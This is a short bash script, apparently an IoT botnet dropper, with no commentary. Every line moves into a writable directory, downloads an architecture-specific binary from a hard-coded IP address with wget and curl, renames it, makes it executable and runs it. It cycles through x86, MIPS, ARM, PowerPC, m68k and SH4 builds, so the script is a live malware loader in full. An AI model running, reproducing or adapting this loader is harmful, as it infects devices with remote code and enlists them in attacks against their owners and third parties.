#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/x86; curl -O http://45.95.146.126/lx/x86;cat x86 >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/mips; curl -O http://45.95.146.126/lx/mips;cat mips >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/mpsl; curl -O http://45.95.146.126/lx/mpsl;cat mpsl >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/arm; curl -O http://45.95.146.126/lx/arm;cat arm >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/arm5; curl -O http://45.95.146.126/lx/arm5;cat arm5 >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/arm6; curl -O http://45.95.146.126/lx/arm6;cat arm6 >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/arm7; curl -O http://45.95.146.126/lx/arm7;cat arm7 >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/ppc; curl -O http://45.95.146.126/lx/ppc;cat ppc >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/m68k; curl -O http://45.95.146.126/lx/m68k;cat m68k >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/sh4; curl -O http://45.95.146.126/lx/sh4;cat sh4 >yk;chmod +x *;./yk ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.126/lx/x86; curl -O http://45.95.146.126/lx/x86;cat x86 >yk;chmod +x *;./yk ssh
